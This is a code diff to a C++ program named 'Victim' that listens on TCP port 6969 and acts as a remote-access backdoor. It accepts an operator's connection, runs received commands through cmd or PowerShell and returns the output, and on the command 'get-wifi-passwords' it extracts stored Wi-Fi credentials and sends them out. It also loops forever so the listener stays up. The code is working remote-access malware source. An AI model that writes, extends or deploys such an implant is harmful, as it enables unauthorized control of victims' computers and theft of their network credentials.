@@ -1,6 +1,8 @@
 #include <stdio.h> 
 #include <stdlib.h> 
-#include "helpers.hpp"
+#include <string>
+#include "includes/helpers.hpp"
+#include "includes/wifi_password_extractor.hpp"
 
 #ifdef _WIN32
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
@@ -19,40 +21,59 @@
 class Victim {
 	std::string ipAddr;
 	int portNumber;
+	SOCKET sAcceptSocket;
+	SOCKET TCPServerSocket;
+	std::string recvdIPAddr;
+	int recvdPort;
+
+	bool sendData(std::string buffer) {
+		int iSend = send(sAcceptSocket, buffer.c_str(), buffer.length(), 0);
+		if (iSend == SOCKET_ERROR) {
+			std::cout << "[!] Unable to send data to the server " << recvdIPAddr << std::endl;
+			#ifdef _WIN32
+			std::cout << "Error: " << WSAGetLastError() << std::endl;
+			#endif
+			return false;
+		}
+		std::cout << "Data " << buffer << " sent to " << recvdIPAddr << " successfully!\n";
+		return true;
+	}
+	std::string recvData() {
+		char recvBuffer[BUFFER_LENGTH];
+		int iRecv = recv(sAcceptSocket, recvBuffer, BUFFER_LENGTH, 0);
+		if (iRecv == SOCKET_ERROR) {
+			std::cout << "[!] Unable to receive data.\n";
+			#ifdef _WIN32
+			std::cout << "Error: " << WSAGetLastError() << std::endl;
+			WSACleanup();
+			#endif
+			return "";
+		}
+		return recvBuffer;
+	}
 public:
 	Victim(std::string ipAddr = "0.0.0.0", int portNumber = 6969)
 		: ipAddr(ipAddr), portNumber(portNumber)
 	{ }
 	void setIPAddress(std::string ipAddr) { this->ipAddr = ipAddr; }
 	void setPortNumber(int portNumber) { this->portNumber = portNumber; }
+	void shellexec(bool ps = false) {
 
+	}
 	bool establishConnection() {
-#ifdef _WIN32
+		#ifdef _WIN32
 		WSADATA winSockData;
 		int iWsaStartup;
 		int iWsaCleanup;
-#endif
-		SOCKET TCPServerSocket;
-		int iCloseSocket;
-
+		#endif
 		sockaddr_in TCPServerAddr;
-		sockaddr_in TCPClientAddr;
-		int iTCPClientAddr = sizeof(TCPClientAddr);
 
 		int iBind;
 		int iListen;
-
-		SOCKET sAcceptSocket;
-		int iSend;
-		int iRecv;
-		char recvBuffer[BUFFER_LENGTH] = { 0 };
-		int iRecvBuffer = strlen(recvBuffer) + 1;
-
 		int maxConns = 2;
-
 		// Actual Code
 		Helpers::divider();
-#ifdef _WIN32
+		#ifdef _WIN32
 		WORD wVersion = MAKEWORD(2, 2);
 		iWsaStartup = WSAStartup(wVersion, &winSockData);
 
@@ -60,30 +81,29 @@ public:
 			std::cout << "[!] WSAStartup Failed!.\nFollowing error occurred: " << iWsaStartup << std::endl;
 			return false;
 		}
-		std::cout << "[*] WSAStartup Successful!\n";
-#endif
+		#endif
 
 		TCPServerAddr.sin_family = AF_INET;
-#ifdef _WIN32
+		#ifdef _WIN32
 		TCPServerAddr.sin_addr.S_un.S_addr = inet_addr(this->ipAddr.c_str());
-#endif
-#ifdef __linux__
+		#endif
+		#ifdef __linux__
 		TCPServerAddr.sin_addr.s_addr = inet_addr(this->ipAddr.c_str());
-#endif
+		#endif
 		TCPServerAddr.sin_port = htons(this->portNumber);
 
 		TCPServerSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 		if (TCPServerSocket == INVALID_SOCKET) {
 			std::cout << "[!] Unable to create socket!\n";
-#ifdef _WIN32
+			#ifdef _WIN32
 			std::cout << "Error: " << WSAGetLastError() << std::endl;
 			WSACleanup();
-#endif
+			#endif
 			return false;
 		}
 		#ifdef __linux__
 		int opt = 1;
-		if (setsockopt(TCPServerSocket, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,&opt, sizeof(opt))){
+		if (setsockopt(TCPServerSocket, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
 			std::cout << "[!] An Error occurred while setting the socket options!\n";
 			return false;
 		}
@@ -91,98 +111,122 @@ public:
 		iBind = bind(TCPServerSocket, (sockaddr*)&TCPServerAddr, sizeof(TCPServerAddr));
 		if (iBind == SOCKET_ERROR) {
 			std::cout << "[!] Unable to bind to " << ipAddr << " on port " << portNumber << std::endl;
-#ifdef _WIN32
+			#ifdef _WIN32
 			std::cout << "Error: " << WSAGetLastError() << std::endl;
 			WSACleanup();
-#endif
+			#endif
 			return false;
 		}
 		iListen = listen(TCPServerSocket, maxConns);
 		if (iListen == SOCKET_ERROR) {
 			std::cout << "[!] Unable to listen on port " << portNumber << std::endl;
-#ifdef _WIN32
+			#ifdef _WIN32
 			std::cout << "Error: " << WSAGetLastError() << std::endl;
 			WSACleanup();
-#endif
+			#endif
 			return false;
 		}
 		std::cout << "[*] Listening on " << ipAddr << ":" << portNumber << std::endl;
 		Helpers::divider();
-		sAcceptSocket = accept(TCPServerSocket, (sockaddr*)&TCPClientAddr, (socklen_t*)&iTCPClientAddr);
+		return true;
+	}
+	bool acceptConnection() {
+
+		sockaddr_in TCPClientAddr;
+		int iTCPClientAddr = sizeof(TCPClientAddr);
+
+		int iSend;
+		int iRecv;
+		char recvBuffer[BUFFER_LENGTH] = { 0 };
+		int iRecvBuffer = strlen(recvBuffer) + 1;
+		int iCloseSocket;
+		this->sAcceptSocket = accept(this->TCPServerSocket, (sockaddr*)&TCPClientAddr, (socklen_t*)&iTCPClientAddr);
 		if (sAcceptSocket == INVALID_SOCKET) {
 			std::cout << "[!] An error occured while accepting connection from " << ipAddr << " on port " << portNumber << "!\n";
-#ifdef _WIN32
+			#ifdef _WIN32
 			std::cout << "Error: " << WSAGetLastError() << std::endl;
 			WSACleanup();
-#endif
+			#endif
 			return false;
 		}
-
 		// Converting the LONG Data to an IP Address
 		char ipAddr[INET_ADDRSTRLEN];
-#ifdef _WIN32
+		#ifdef _WIN32
 		inet_ntop(AF_INET, &(TCPClientAddr.sin_addr.S_un.S_addr), ipAddr, INET_ADDRSTRLEN);
-#endif
-#ifdef __linux__
+		#endif
+		#ifdef __linux__
 		inet_ntop(AF_INET, &(TCPClientAddr.sin_addr.s_addr), ipAddr, INET_ADDRSTRLEN);
-#endif
-		std::cout << "[*] Accepted Connection from " << ipAddr << ":" << TCPClientAddr.sin_port << std::endl;
+		#endif
+		for (size_t i = 0; i < strlen(ipAddr); i++)
+			recvdIPAddr += ipAddr[i];
+		recvdPort = TCPClientAddr.sin_port;
+		std::cout << "[*] Accepted Connection from " << recvdIPAddr << ":" << recvdPort << std::endl;
 		Helpers::divider();
-		std::string banner = Helpers::getBanner(ipAddr);
+		return true;
+	}
+	void sendBanner() {
+		std::string victimIP = recvData();
+		std::string banner = Helpers::getBanner(victimIP.c_str());
 		int bannerLen = banner.length();
 		banner.insert(0, Helpers::getDivider(bannerLen));
 		banner += Helpers::getDivider(bannerLen);
-		send(sAcceptSocket, banner.c_str(), banner.length(), 0);
-
-		iRecv = recv(sAcceptSocket, recvBuffer, BUFFER_LENGTH, 0);
-		if (iRecv == SOCKET_ERROR) {
-			std::cout << "[!] Unable to receive data.\n";
-#ifdef _WIN32
-			std::cout << "Error: " << WSAGetLastError() << std::endl;
-			WSACleanup();
-#endif
-			return false;
+		sendData(banner);
+	}
+	void run() {
+		std::string recvBuffer = "";
+		bool kill=false;
+		while(!kill){
+			recvBuffer = recvData();
+			if(recvBuffer == "invoke-shell" || recvBuffer == "invoke-ps-shell"){
+				bool isPS = (recvBuffer == "invoke-ps-shell");
+				std::string recvdCMD;
+				std::string cmdOut;
+				std::string senderBuffer = (isPS) ? Helpers::getPowerShellPrompt() : Helpers::getShell();
+				sendData(senderBuffer);
+				do {
+					recvdCMD = Helpers::removeNewline(recvData().c_str());
+					if (!(recvdCMD == "shellexit")) {
+						if (isPS) {
+							recvdCMD.insert(0, "powershell -c \"");
+							recvdCMD += "\"";
+						}
+						cmdOut = Helpers::executeCommand(recvdCMD.c_str());
+						sendData(cmdOut);
+					}
+					if (recvdCMD == "shellexit")
+						sendData("exit");
+				} while (recvdCMD != "shellexit");
+			}
+			if(recvBuffer == "get-wifi-passwords"){
+				WifiExtractor* wf = new WifiExtractor();
+				std::string creds = wf->getCreds();
+				sendData(creds);
+			}
+			if(recvBuffer == "closeconn"){
+				kill = true;
+			}
+			std::cout << "Recevied: " << recvBuffer << std::endl;
 		}
-		if (Helpers::toString(recvBuffer) == "invoke-shell"){
-			std::string senderBuffer = Helpers::getShell();
-			std::cout << senderBuffer << std::endl;
-			int iSenderBuffer = strlen(senderBuffer.c_str()) + 1;
-			iSend = send(sAcceptSocket, senderBuffer.c_str(), iSenderBuffer, 0);
-		}
-		// std::string senderBuffer = Helpers::executeCommand(recvBuffer) + '\n';
-		// int iSenderBuffer = strlen(senderBuffer.c_str()) + 1;
-		// iSend = send(sAcceptSocket, senderBuffer.c_str(), iSenderBuffer, 0);
-		if (iSend == SOCKET_ERROR) {
-			std::cout << "[!] Unable to send data.\n";
-#ifdef _WIN32
-			std::cout << "Error: " << WSAGetLastError() << std::endl;
-			WSACleanup();
-#endif
-			return false;
-		}
-
-		// Stripping new line.
-		recvBuffer[std::remove_if(recvBuffer, recvBuffer + strlen(recvBuffer), [](char c) { return c == '\n'; }) - recvBuffer] = 0;
-		printf("[*] Output of command %s sent to client %s successfully!\n", recvBuffer, ipAddr);
-
-		iCloseSocket = closesocket(sAcceptSocket);
-		if (iCloseSocket == SOCKET_ERROR) {
-			std::cout << "[!] Unable to close socket.\n";
-#ifdef _WIN32
-			std::cout << "Error: " << WSAGetLastError() << std::endl;
-			WSACleanup();
-#endif
-		}
-#ifdef _WIN32
+		return;
+	}
+	~Victim(){
+		#ifdef _WIN32
 		WSACleanup();
-#endif
+		#endif
 		closesocket(TCPServerSocket);
-		Helpers::divider();
-		return true;
+		std::cout << "[+] Connection terminated with " << recvdIPAddr << " on port " << portNumber << std::endl;
 	}
 };
 
 int main() {
-	Victim* v = new Victim();
-	v->establishConnection();
+	while(true){
+		Victim* v = new Victim();
+		if (v->establishConnection()) {
+			if (v->acceptConnection()) {
+				v->sendBanner();
+				v->run();
+			}
+		}
+		v->~Victim();
+	}
 }
